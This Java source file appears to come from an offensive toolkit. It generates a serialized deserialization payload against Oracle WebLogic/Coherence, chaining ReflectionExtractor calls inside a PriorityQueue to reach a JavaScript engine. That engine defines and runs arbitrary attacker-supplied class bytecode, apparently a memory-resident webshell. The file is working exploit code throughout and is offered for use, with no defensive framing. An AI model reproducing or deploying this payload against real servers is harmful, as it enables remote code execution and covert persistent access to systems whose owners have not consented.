package com.feihong.payload;

import com.feihong.template.WeblogicMemshellTemplate;
import com.feihong.utils.ClassFiles;
import com.feihong.utils.Gadgets;
import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import org.apache.shiro.codec.Base64;

import javax.management.BadAttributeValueExpException;
import javax.script.ScriptEngineManager;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class ScriptEnginePayload_2883 {
    public static byte[] generate(Class cls) throws Exception {
        byte[] bytes = ClassFiles.classAsBytes(cls);
        String classCode = Base64.encodeToString(bytes);

        String code = "var bytes = org.apache.shiro.codec.Base64.decode('" + classCode + "');\n" +
                "        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "        try{\n" +
                "            var clazz = classLoader.loadClass('" + cls.getName() + "');\n" +
                "            clazz.newInstance();\n" +
                "        }catch(err){\n" +
                "            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "            method.setAccessible(true);\n" +
                "            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "            clazz.newInstance();\n" +
                "        }";

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[0]}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "getEngineByName",
                new Object[]{"javascript"}
        );

        ReflectionExtractor extractor4 = new ReflectionExtractor(
                "eval",
//                new Object[]{"java.lang.Thread.sleep(5000);"}
                new Object[]{code}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
                extractor4
        };

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, extractors);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = ScriptEngineManager.class;
        queueArray[1] = "1";

        //序列化
        return Util.serialize(queue);
    }
}
